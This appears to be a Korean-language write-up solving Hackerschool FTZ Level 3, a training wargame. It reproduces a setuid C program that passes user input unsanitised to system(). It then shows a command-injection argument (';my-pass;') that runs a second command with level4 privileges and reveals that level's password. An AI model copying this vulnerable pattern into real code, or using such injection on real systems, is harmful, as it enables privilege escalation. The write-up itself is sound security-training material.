# Hackerschool FTZ Level 03

```
login as: level3
level3@192.168.18.131's password:
[level3@ftz level3]$ ls
hint  public_html  tmp
[level3@ftz level3]$ cat hint




다음 코드는 autodig의 소스이다.


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv){

    char cmd[100];

    if( argc!=2 ){
        printf( "Auto Digger Version 0.9\n" );
        printf( "Usage : %s host\n", argv[0] );
        exit(0);
    }


    strcpy( cmd, "dig @" );
    strcat( cmd, argv[1] );
    strcat( cmd, " version.bind chaos txt");


    system( cmd );

}


이를 이용하여 level4의 권한을 얻어라.


more hints.
- 동시에 여러 명령어를 사용하려면?
- 문자열 형태로 명령어를 전달하려면?




[level3@ftz level3]$ find / -perm -4000 -user level4 2>/dev/null
/bin/autodig
[level3@ftz level3]$ /bin/autodig ";my-pass;"
dig: Couldn't find server '': Name or service not known


Level4 Password is "suck my brain".


sh: line 1: version.bind: command not found
[level3@ftz level3]$
```

힌트를 보면 동시에 여러 명령어를 사용하는 방법과, 이를 문자열 형태로 전달하는 방법에 대해서 물어보고 있다.

먼저 `level4` 계정의 권한을 가진 파일을 찾으니, `/bin/autodig` 라는 파일이 나온다. 위 힌트에서 이 파일의 소스를 함께 제공해줬다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv){

    char cmd[100];

    if( argc!=2 ){
        printf( "Auto Digger Version 0.9\n" );
        printf( "Usage : %s host\n", argv[0] );
        exit(0);
    }


    strcpy( cmd, "dig @" );
    strcat( cmd, argv[1] );
    strcat( cmd, " version.bind chaos txt");


    system( cmd );

}
```

Command Injection 을 통해서 풀 수 있는데, `;` 를 사용하여 명령어를 분할하고, `"` 를 사용하여 문자열로 전달하면 된다.

즉, `/bin/autodig ";my-pass;"` 다음과 같이 실행하게 되면
- `dig @`
- `my-pass`
- ` version.bind chaos txt`

이렇게 3개의 명령어로 분할이 되어서 실행되게 된다.

그리하여 `level4` 권한으로 `my-pass` 가 실행되게 되었다.